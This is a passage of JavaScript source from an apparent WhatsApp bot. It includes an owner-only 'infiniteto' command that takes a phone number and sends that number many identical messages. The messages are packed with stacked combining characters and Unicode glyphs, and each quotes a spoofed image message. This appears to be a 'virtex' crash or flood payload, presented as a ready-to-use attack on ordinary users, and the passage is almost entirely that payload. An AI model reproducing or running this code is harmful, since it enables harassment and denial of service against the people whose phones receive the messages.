            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            break
            case 'infiniteto':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 